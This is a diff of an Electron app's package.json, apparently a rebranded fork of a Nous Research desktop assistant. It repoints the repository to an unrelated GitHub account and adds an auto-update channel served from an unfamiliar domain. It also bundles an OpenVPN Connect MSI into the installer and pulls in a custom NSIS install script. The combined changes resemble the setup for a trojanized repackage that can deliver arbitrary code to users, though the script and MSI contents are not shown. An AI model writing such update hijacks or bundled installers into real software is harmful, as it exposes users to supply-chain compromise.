@@ -2,12 +2,12 @@
   "name": "hermes",
   "productName": "Hermes-企业助手",
   "private": true,
-  "version": "0.17.0",
+  "version": "0.20.7",
   "description": "Hermes-企业助手 — enterprise desktop.",
   "author": "Nous Research",
   "repository": {
     "type": "git",
-    "url": "git+https://github.com/NousResearch/hermes-agent.git"
+    "url": "git+https://github.com/bri12afdsarker96-lgtm/hermes-agent-mercury.git"
   },
   "type": "module",
   "main": "dist/electron-main.mjs",
@@ -119,6 +119,7 @@
     "d3-force": "3.0.0",
     "dnd-core": "14.0.1",
     "dompurify": "3.4.13",
+    "electron-updater": "6.8.9",
     "emojibase-data": "16.0.3",
     "fflate": "0.8.3",
     "frimousse": "0.3.0",
@@ -195,6 +196,10 @@
       }
     ],
     "artifactName": "Hermes-企业助手-${version}-${arch}.${ext}",
+    "publish": {
+      "provider": "generic",
+      "url": "https://ppbb096.site/desktop-updates/windows/x64/"
+    },
     "icon": "assets/brand/hermes-mark-hires.png",
     "directories": {
       "output": "release"
@@ -220,6 +225,14 @@
       {
         "from": "src/fonts/LICENSE-HarmonyOS-Sans.txt",
         "to": "licenses/LICENSE-HarmonyOS-Sans.txt"
+      },
+      {
+        "from": "assets/openvpn-connect-manifest.json",
+        "to": "openvpn-connect/manifest.json"
+      },
+      {
+        "from": "build/openvpn-connect/openvpn-connect-3.9.0.5008_signed.msi",
+        "to": "openvpn-connect/openvpn-connect-3.9.0.5008_signed.msi"
       }
     ],
     "asar": true,
@@ -277,7 +290,7 @@
         "nsis",
         "msi"
       ],
-      "signAndEditExecutable": false
+      "signAndEditExecutable": true
     },
     "linux": {
       "category": "Development",
@@ -290,6 +303,8 @@
       ]
     },
     "nsis": {
+      "include": "electron/enterprise-installer.nsh",
+      "allowElevation": false,
       "oneClick": false,
       "allowToChangeInstallationDirectory": true,
       "perMachine": false,
